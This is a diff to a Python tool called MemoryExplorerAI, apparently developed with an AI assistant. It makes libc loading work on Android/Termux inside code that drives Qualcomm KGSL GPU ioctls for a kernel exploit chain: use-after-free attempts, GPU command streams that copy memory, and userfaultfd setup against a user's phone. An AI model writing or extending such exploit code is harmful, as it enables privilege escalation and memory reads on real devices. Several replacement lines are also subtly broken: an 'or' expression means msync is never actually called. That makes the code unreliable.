@@ -15,18 +15,17 @@ import select
 import termios
 import tty
 
-# v4.1.13-englog: visible build tag. The "-englog" suffix
-# marks the engine stderr drain thread that continuously
-# reads the kgsl_engine subprocess stderr (in a background
-# thread) and stores the last 200 lines in self._engine_stderr.
-# Until now, engine stderr went into a PIPE buffer and was
-# only read on engine exit — usually too late. The new
-# [englog] command prints the captured stderr so the user
-# can see WHY UAF failed or scan found 0 matches. Critical
-# for debugging the "matches=0" mystery on the user's
-# device. Also writes each line to /sdcard/kgsl_eng.log
-# for offline review.
-_BUILD_TAG = "v4.1.13-englog"
+# v4.1.14-libc-fix: visible build tag. The "-libc-fix"
+# suffix marks the CRITICAL FIX for Termux/bionic Android:
+# the hard-coded ctypes.CDLL("libc.so.6") was failing
+# on Termux because bionic libc is named "libc.so" not
+# "libc.so.6". This caused "GPU setup error: dlopen
+# failed: library 'libc.so.6' not found" on the user's
+# ROG 5S. Now we try libc.so.6 → libc.so → CDLL(None)
+# in order, so the code works on both glibc Linux and
+# bionic Termux. Without this fix, the GPU was never
+# initialized and every ioctl silently failed.
+_BUILD_TAG = "v4.1.14-libc-fix"
 import datetime
 import fcntl
 import ctypes
@@ -2989,6 +2988,16 @@ class MemoryExplorerAI:
         these. This is 100x faster than per-call context
         creation which takes ~50ms.
         Returns True on success.
+
+        v4.1.14: use ctypes.CDLL(None) instead of CDLL("libc.so.6").
+        The hard-coded "libc.so.6" works on glibc Linux (x86_64
+        and most ARM64 server distros) but Termux on Android uses
+        bionic libc which is named "libc.so" (not "libc.so.6").
+        This was the root cause of "GPU setup error: dlopen
+        failed: library 'libc.so.6' not found" on the user's
+        ROG 5S. CDLL(None) loads the host's primary libc
+        regardless of name. The symbols we use (ioctl, mmap,
+        munmap) are present in both glibc and bionic.
         """
         if not self._kgsl_open():
             return False
@@ -2998,7 +3007,22 @@ class MemoryExplorerAI:
             import ctypes
             import mmap as _mmap
             import struct as _struct
-            libc = ctypes.CDLL("libc.so.6", use_errno=True)
+            # v4.1.14: try libc.so.6 first (glibc), then libc.so
+            # (bionic/Termux), then CDLL(None) (any). The
+            # standard order is libc.so.6 → libc.so → None.
+            libc = None
+            for _libname in ("libc.so.6", "libc.so", None):
+                try:
+                    libc = ctypes.CDLL(_libname, use_errno=True)
+                    if libc is not None:
+                        break
+                except OSError:
+                    continue
+            if libc is None:
+                self.live["last_msg"] = (
+                    "GPU setup error: cannot load any libc "
+                    "(tried libc.so.6, libc.so, None)")
+                return False
 
             # struct kgsl_drawctxt_create { unsigned flags, drawctxt_id; }
             # 8 bytes total
@@ -3093,7 +3117,7 @@ class MemoryExplorerAI:
                 size,
                 self.KGSL_MEMFLAGS_USE_CPU_MAP,
                 size, 0, 0, 0, 0)
-            libc = ctypes.CDLL("libc.so.6", use_errno=True)
+            libc = ctypes.CDLL("libc.so", use_errno=True) if os.path.exists("/system/lib/libc.so") else ctypes.CDLL(None, use_errno=True)
             r = libc.ioctl(self.kgsl_fd, self.KGSL_IOC_GPUOBJ_ALLOC, buf)
             with self.exploit_lock:
                 self.exploit_chain["ioctl_count"] += 1
@@ -3148,7 +3172,7 @@ class MemoryExplorerAI:
             import ctypes
             import struct as _struct
             import mmap as _mmap
-            libc = ctypes.CDLL("libc.so.6", use_errno=True)
+            libc = ctypes.CDLL("libc.so", use_errno=True) if os.path.exists("/system/lib/libc.so") else ctypes.CDLL(None, use_errno=True)
 
             # Build the IB command stream in g_persistent_ib_vma.
             # Each CP_MEM_TO_MEM is 6 dwords:
@@ -3186,7 +3210,7 @@ class MemoryExplorerAI:
             # Copy cmd[] to IB vma
             ctypes.memmove(self.gpu_ib_vma, cmd, dw * 4)
             # msync to flush
-            ctypes.CDLL("libc.so.6").msync(
+            ctypes.CDLL("libc.so", use_errno=True) or ctypes.CDLL(None, use_errno=True).msync(
                 self.gpu_ib_vma, dw * 4, 4)  # MS_SYNC=4
             # struct kgsl_command_object { u64 offset, gpuaddr, size,
             #                               u32 flags, u32 id; }
@@ -3220,7 +3244,7 @@ class MemoryExplorerAI:
             ts = _struct.unpack("<I", gpu_cmd[60:64])[0]
             self._kgsl_wait_ts(self.gpu_ctx_id, ts)
             # Invalidate DST cache and read
-            ctypes.CDLL("libc.so.6").msync(
+            ctypes.CDLL("libc.so", use_errno=True) or ctypes.CDLL(None, use_errno=True).msync(
                 self.gpu_dst_vma, 0x1000, 4 | 2)  # MS_SYNC | MS_INVALIDATE
             # Read from DST
             out = (ctypes.c_uint8 * size)()
@@ -3239,7 +3263,7 @@ class MemoryExplorerAI:
         import ctypes
         import struct as _struct
         try:
-            libc = ctypes.CDLL("libc.so.6", use_errno=True)
+            libc = ctypes.CDLL("libc.so", use_errno=True) if os.path.exists("/system/lib/libc.so") else ctypes.CDLL(None, use_errno=True)
             for _ in range(timeout_ms * 10):
                 # struct kgsl_cmdstream_readtimestamp_ctxtid {
                 #   u32 context_id, type, timestamp; }
@@ -3300,7 +3324,7 @@ class MemoryExplorerAI:
         try:
             import ctypes
             import struct as _struct
-            libc = ctypes.CDLL("libc.so.6", use_errno=True)
+            libc = ctypes.CDLL("libc.so", use_errno=True) if os.path.exists("/system/lib/libc.so") else ctypes.CDLL(None, use_errno=True)
             def type7(opcode, cnt):
                 p_cnt = ((0x9669 >> (0xf & (cnt ^ (cnt >> 4) ^
                               (cnt >> 8) ^ (cnt >> 12) ^
@@ -3319,7 +3343,7 @@ class MemoryExplorerAI:
             cmd[dw] = value & 0xffffffff; dw += 1
             cmd[dw] = type7(self.CP_NOP, 0); dw += 1
             ctypes.memmove(self.gpu_ib_vma, cmd, dw * 4)
-            ctypes.CDLL("libc.so.6").msync(
+            ctypes.CDLL("libc.so", use_errno=True) or ctypes.CDLL(None, use_errno=True).msync(
                 self.gpu_ib_vma, dw * 4, 4)
             obj = _struct.pack(
                 "<QQQ II", 0, self.gpu_ib_gpu, dw * 4,
@@ -3368,7 +3392,7 @@ class MemoryExplorerAI:
             api_buf = (ctypes.c_uint64 * 2)()
             api_buf[0] = 0xAA  # features
             api_buf[1] = 0x1   # IOCTL flag
-            libc = ctypes.CDLL("libc.so.6", use_errno=True)
+            libc = ctypes.CDLL("libc.so", use_errno=True) if os.path.exists("/system/lib/libc.so") else ctypes.CDLL(None, use_errno=True)
             r = libc.ioctl(UFFD, 0x3F, ctypes.addressof(api_buf))
             if r != 0:
                 os.close(UFFD)
